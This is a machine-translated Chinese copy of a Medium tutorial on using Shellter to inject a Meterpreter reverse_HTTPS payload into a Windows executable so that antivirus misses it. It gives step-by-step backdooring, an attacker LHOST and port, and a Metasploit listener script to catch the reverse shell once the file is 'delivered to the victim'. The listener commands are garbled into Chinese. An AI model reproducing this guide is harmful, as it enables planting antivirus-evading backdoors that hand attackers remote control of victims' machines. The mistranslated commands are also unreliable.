> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [medium.com](https://medium.com/@arshiadev/how-to-bypass-antiviruses-by-using-shelter-978443b386d8)

> Shellter is another antivirus Evasion tool, which infects the PE dynamically and is also used to inje......

Shellter 是另一种防病毒规避工具，它动态感染 PE，还用于将 shellcode 注入任何 32 位本机 Windows 应用程序。它允许攻击者自定义有效负载或利用 Metasploit 框架。大多数防病毒软件将无法识别恶意可执行文件，这取决于攻击者如何重新编码无穷无尽的签名。

Shellter 可以通过在终端中运行 **apt-get install shellter 来安装**。安装应用程序后，我们应该能够通过在终端中发出 shellter 命令来打开 **Shellter**，并能够看到以下屏幕截图，我们准备在任何可执行文件上创建后门：

![](https://miro.medium.com/max/875/1*1kTrPG8Sb5xC1INXJM2Qfw.jpeg)

Shellter 启动后，以下是创建恶意可执行文件的典型步骤：

1.  攻击者应该可以选择**自动 (A)** 或**手动 (M)** 以及**帮助 (H)**。出于演示目的，我们将使用**自动**模式。
2.  下一步是提供 PE 目标文件；攻击者可以选择任何**.exe** 文件或利用 **/usr/share/windows-binaries/** 中的可执行文件。
3.  一旦提供了 PE 目标文件位置，Shellter 将能够反汇编 PE 文件，如下面的屏幕截图所示：

![](https://miro.medium.com/max/875/1*KymQq9-wocCn7UdagRFrFQ.jpeg)

4. 4. 拆解完成后，Shellter 会提供是否开启隐身模式的选项。

5. 选择隐身模式后，您将能够将列出的有效负载注入到同一个 PE 文件中，如下图所示，或者您可以使用 c 自定义有效负载：

![](https://miro.medium.com/max/875/1*vBg-5pp7e6PS9PfoZIMXaA.jpeg)

6. 在本例中，我们使用 Meterpreter_reverse_HTTPS 并提供 LHOST 和 LPORT，如下图所示：

![](https://miro.medium.com/max/573/1*waMCajai19EqLv5DCY_kZg.jpeg)

7. 所有需要的信息都在提供的同一个 PE 文件中提供给 Shellter，因为输入现在与有效负载一起注入，并且注入完成：

![](https://miro.medium.com/max/875/1*YmtB8ZaD6A0QNEcUZ2IxEQ.jpeg)

现在，最终的可执行文件已准备好被防病毒软件扫描。在本例中，我们将使用 Windows Bitdefender 扫描可执行文件，如下图所示：

![](https://miro.medium.com/max/875/1*sbCDO6Sbi9Lvd0IDA28L7g.jpeg)

一旦这个可执行文件被交付给受害者，攻击者现在将能够根据有效负载打开监听器；在我们的示例中，LHOST 是 192.168.0.24，LPORT 是 443：

```
使用exploit/multi/handler 
设置有效负载 windows/meterpretere/reverse_HTTPS
设置 lhost <你的 IP 地址>
设置 lport 443
设置退出会话假
利用 -j -z

```

现在，您可以将前面的命令列表保存为 listener.rc 的文件名，并通过运行 msfconsole -r listener.rc 使用 Metasploit 运行它。一旦受害者在没有被杀毒软件或任何安全控制阻止的情况下打开，它应该会毫无问题地打开通往攻击者 IP 的隧道，如下面的屏幕截图所示：

![](https://miro.medium.com/max/875/1*X1kd-7m6_EC0looVE-IdrA.jpeg)

这就是构建后门并将其植入受害系统的最有效方法。

大多数防病毒软件将能够捕获反向 Meterpreter shell；但是，建议渗透测试人员在放弃漏洞利用之前进行多次编码。